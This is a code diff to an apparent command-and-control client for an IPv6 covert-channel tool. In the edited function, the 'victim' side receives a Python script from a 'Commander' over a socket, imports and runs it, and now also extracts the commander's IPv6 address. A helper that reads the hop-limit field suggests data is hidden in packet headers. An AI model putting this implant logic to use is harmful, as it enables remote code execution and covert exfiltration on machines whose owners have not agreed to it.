@@ -683,8 +683,10 @@ def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client
         of the executing host machine
     """
     # Get the file name from Commander
-    file_path = client_socket.recv(1024).decode()
+    res = client_socket.recv(1024).decode().split("/")
+    file_path = res[0]
     file_name = file_path.split(".")[0]  # => Must be without .py extension for importing
+    cmdr_ipv6_addr = res[1]
 
     # Receive File if exists (MUST DO: put in downloads/[client_ip])
     with open(file_path, "wb") as file:
@@ -713,20 +715,20 @@ def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client
                 print(constants.IPV6_FOUND_MSG.format(ipv6))
                 client_socket.send((constants.VICTIM_ACK + "/" + ipv6 + "/" + str(port)).encode())  # Transfer Result
                 os.remove(file_path)
-                return ipv6, port
+                return ipv6, port, cmdr_ipv6_addr
             else:
                 print(constants.IPV6_OPERATION_ERROR)
                 client_socket.send(constants.IPV6_ERROR_MSG_TO_CMDR.encode())
                 os.remove(file_path)
-                return None, None
+                return None, None, None
         else:
             client_socket.send(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path).encode())
             os.remove(file_path)
-            return None, None
+            return None, None, None
     else:
         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
         os.remove(file_path)
-        return None, None
+        return None, None, None
 
 
 def extract_data_ipv6_version(packet):
@@ -844,8 +846,8 @@ def extract_data_ipv6_hop_limit(packet):
         A string containing binary data from DS field
     """
     if IPv6 in packet:
-        next_header_data = packet[IPv6].hlim
-        binary_data = format(next_header_data, constants.EIGHT_BIT)
+        hop_limit_data = packet[IPv6].hlim
+        binary_data = format(hop_limit_data, constants.EIGHT_BIT)
         return binary_data
 
 
